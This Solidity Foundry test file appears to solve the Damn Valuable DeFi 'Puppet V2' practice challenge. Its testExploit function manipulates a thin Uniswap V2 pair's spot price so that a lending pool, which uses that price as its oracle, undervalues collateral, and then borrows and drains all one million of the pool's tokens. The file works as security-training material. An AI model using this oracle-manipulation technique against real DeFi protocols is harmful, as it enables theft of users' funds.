// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/DamnValuableToken.sol";
import "../../src/puppet-v2/PuppetV2Pool.sol";
import "../../src/uniswap/IUniswapV2Factory.sol";
import "../../src/uniswap/IUniswapV2Pair.sol";
import "../../src/uniswap/IUniswapV2Router02.sol";
import "../../src/IWETH.sol";

contract PuppetV2Test is Test {
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 100 ether;
    uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 10 ether;

    uint256 internal constant ATTACKER_INITAL_TOKEN_BALANCE = 10000 ether;
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 1000000 ether;

    address internal weth;
    DamnValuableToken internal token;
    PuppetV2Pool internal lendingPool;
    IUniswapV2Factory internal uniswapFactory;
    IUniswapV2Router02 internal uniswapRouter;
    IUniswapV2Pair internal uniswapExchange;

    address internal deployer = address(1);
    address internal attacker = address(2);

    function setUp() public {
        // mainnet fork
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

        startHoax(deployer);
        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

        // Deploy Uniswap Factory and Router
        uniswapFactory = IUniswapV2Factory(
            address(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f)
        );
        uniswapRouter = IUniswapV2Router02(
            address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)
        );

        // Create Uniswap pair against WETH and add liquidity
        token.approve(address(uniswapRouter), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapRouter.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token),
            UNISWAP_INITIAL_TOKEN_RESERVE,
            0,
            0,
            deployer,
            block.timestamp
        );
        uniswapExchange = IUniswapV2Pair(
            uniswapFactory.getPair(address(token), weth)
        );
        assertGt(uniswapExchange.balanceOf(deployer), 0);

        // Deploy the lending pool
        lendingPool = new PuppetV2Pool(
            weth,
            address(token),
            address(uniswapExchange),
            address(uniswapFactory)
        );

        // Setup initial token balances of pool and attacker account
        token.transfer(attacker, ATTACKER_INITAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        assertEq(
            lendingPool.calculateDepositOfWETHRequired(1 ether),
            0.3 ether
        );
        assertEq(
            lendingPool.calculateDepositOfWETHRequired(
                POOL_INITIAL_TOKEN_BALANCE
            ),
            300000 ether
        );

        vm.stopPrank();
    }

    function testExploit() public {
        /** YOUR EXPLOIT GOES HERE */
        startHoax(attacker, 20 ether);
        token.approve(address(uniswapRouter), ATTACKER_INITAL_TOKEN_BALANCE);
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = weth;
        uniswapRouter.swapExactTokensForTokens(
            ATTACKER_INITAL_TOKEN_BALANCE,
            0,
            path,
            attacker,
            block.timestamp
        );
        uint256 requiredWeth = 
            lendingPool.calculateDepositOfWETHRequired(
                POOL_INITIAL_TOKEN_BALANCE
            );
        requiredWeth -= IERC20(weth).balanceOf(attacker);
        IWETH(weth).deposit{value: requiredWeth}();
        IERC20(weth).approve(
            address(lendingPool),
            IERC20(weth).balanceOf(attacker)
        );
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        vm.stopPrank();

        /** SUCCESS CONDITION */

        // Attacker has taken all tokens from the pool
        assertEq(token.balanceOf(address(lendingPool)), 0);
        assertGe(token.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
    }

    receive() external payable {}
}
